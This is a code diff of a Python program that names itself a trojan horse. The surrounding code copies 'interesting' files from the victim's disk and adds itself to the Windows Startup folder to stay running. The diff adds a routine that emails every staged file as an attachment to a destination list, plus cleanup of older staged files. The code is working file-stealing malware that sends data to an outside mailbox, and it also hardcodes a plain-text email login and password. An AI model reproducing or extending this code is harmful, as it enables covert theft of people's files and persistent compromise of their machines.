@@ -141,6 +141,9 @@ class Constants:
     EMAIL_LOGIN = "trojanhorsepy@gmail.com"
     EMAIL_PASSWORD = "nattanshimon"
     STARTUP_LOCATION = USER_PATH + r"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+    FIRST_TIME="FIRSTtime.txt"
+    FIRST_TIME_DIR=r"C:\Users\shimon\Desktop\Horse"
+    FIRST_TIME_ALL_DIR=os.path.join(FIRST_TIME_DIR,FIRST_TIME)
     SELF_lOCATION = os.path.abspath(__file__)
     PYTHON_DEFAULT_LOCATION = ""
 
@@ -173,6 +176,22 @@ class OSmanipulation(object):
                             list_of_existing_files.append(file_name)
         f.close()
         return list_of_existing_files
+
+    def erase_old_files(self):
+        if Constants.FIRST_TIME in os.listdir(Constants.FIRST_TIME_DIR):
+            for root, dirs, files in os.walk(Constants.DESTINATION_FOLDER_PATH):
+                for each in files:
+                    temp=str(each)
+                    temp=os.path.join(root,temp)
+                    if os.stat(temp).st_mtime<os.stat(Constants.FIRST_TIME_ALL_DIR).st_mtime:
+                        os.remove(temp)
+            f=open(Constants.FIRST_TIME_ALL_DIR,'w')
+            f.write("a")
+            f.close()            
+        else:
+            f=open(Constants.FIRST_TIME_ALL_DIR,'w')
+            f.close()
+
 
     def Copy_interesting_files(self):
             for root, dirs, files in os.walk(Constants.SEARCH_ROOT):
@@ -310,6 +329,7 @@ class AttachMail():
         self.mailServer.starttls()
         self.mailServer.ehlo()
         self.mailServer.login(Constants.EMAIL_LOGIN, Constants.EMAIL_PASSWORD)
+
     def stop_server(self):
         self.mailServer.close()
     def sendMail(self, to, subject, text, attach):
@@ -327,8 +347,15 @@ class AttachMail():
         part.add_header('Content-Disposition',
                 'attachment; filename="%s"' % os.path.basename(attach))
         msg.attach(part)
-        self.mailServer.sendmail(gmail_name, to, msg.as_string())
-
+        self.mailServer.sendmail(Constants.EMAIL_LOGIN, to, msg.as_string())
+    def sendMailInFolder(self):
+        self.start_server()
+        for root, dirs, files in os.walk(Constants.DESTINATION_FOLDER_PATH):
+            for each in files:
+                temp=str(each)
+                temp=os.path.join(root,temp)
+                self.sendMail(Constants.EMAIL_DESTINATION_LIST,"python","python",temp)
+        self.stop_server()
 
 def add_self_to_startup():
     # Check if program is in startup
